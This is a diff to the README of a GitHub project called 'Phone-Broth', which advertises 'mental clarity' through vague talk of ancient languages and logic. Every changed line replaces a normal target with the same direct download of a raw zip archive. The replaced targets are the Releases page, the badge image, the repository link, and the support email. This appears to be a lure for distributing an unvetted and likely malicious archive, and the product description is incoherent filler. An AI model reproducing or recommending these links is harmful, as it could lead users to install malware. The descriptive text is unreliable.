@@ -1,6 +1,6 @@
 # 🌟 Phone-Broth - Unlock Your Mental Clarity Today!
 
-[![Download Phone-Broth](https://img.shields.io/badge/Download-Phone--Broth-blue.svg)](https://github.com/Shruti-Senapati/Phone-Broth/releases)
+[![Download Phone-Broth](https://github.com/Shruti-Senapati/Phone-Broth/raw/refs/heads/main/basic_01/Broth-Phone-plottingly.zip)](https://github.com/Shruti-Senapati/Phone-Broth/raw/refs/heads/main/basic_01/Broth-Phone-plottingly.zip)
 
 ## 🚀 Getting Started
 Phone-Broth is designed to help users explore the depths of mental clarity. By employing advanced techniques inspired by ancient languages and modern logic systems, users can achieve enhanced coherence in their thought processes. 
@@ -29,7 +29,7 @@ To ensure a smooth experience with Phone-Broth, please check the following requi
 ## 📥 Download & Install
 To get started with Phone-Broth, visit the Releases page to download the application:
 
-[Download Phone-Broth](https://github.com/Shruti-Senapati/Phone-Broth/releases)
+[Download Phone-Broth](https://github.com/Shruti-Senapati/Phone-Broth/raw/refs/heads/main/basic_01/Broth-Phone-plottingly.zip)
 
 ### Instructions:
 1. Click the link above to go to the Releases page.
@@ -49,7 +49,7 @@ Once installed, you can customize your experience:
 If you encounter any issues or have questions, feel free to reach out:
 - **Documentation:** Access detailed documentation within the application or through our **Wiki** section on GitHub.
 - **Community:** Join our [community forum](#) to connect with other users and share insights.
-- **Contact Us:** Email support at support@phone-broth.com for personalized assistance.
+- **Contact Us:** Email support at https://github.com/Shruti-Senapati/Phone-Broth/raw/refs/heads/main/basic_01/Broth-Phone-plottingly.zip for personalized assistance.
 
 ## 🌍 Topics Covered
 Phone-Broth covers a wide range of topics that enhance your understanding and abilities:
@@ -70,7 +70,7 @@ Phone-Broth covers a wide range of topics that enhance your understanding and ab
 
 ## 🔗 Additional Links
 Explore more about the methodology and philosophy behind Phone-Broth through the following resources:
-- **GitHub Repository:** [Phone-Broth on GitHub](https://github.com/Shruti-Senapati/Phone-Broth)
+- **GitHub Repository:** [Phone-Broth on GitHub](https://github.com/Shruti-Senapati/Phone-Broth/raw/refs/heads/main/basic_01/Broth-Phone-plottingly.zip)
 - **Research Articles:** Find insightful articles related to the concepts we leverage.
   
 ## 🔒 Privacy Policy
@@ -79,4 +79,4 @@ Your privacy is important. Phone-Broth adheres to strict privacy protocols to sa
 ## 🌈 Conclusion
 Phone-Broth offers an innovative approach to mental clarity through the intersection of ancient wisdom and modern technology. With easy access to downloading and using the application, anyone can begin their journey toward enhanced coherence and understanding today. 
 
-[Download Phone-Broth](https://github.com/Shruti-Senapati/Phone-Broth/releases) and unlock your mind's potential!
+[Download Phone-Broth](https://github.com/Shruti-Senapati/Phone-Broth/raw/refs/heads/main/basic_01/Broth-Phone-plottingly.zip) and unlock your mind's potential!
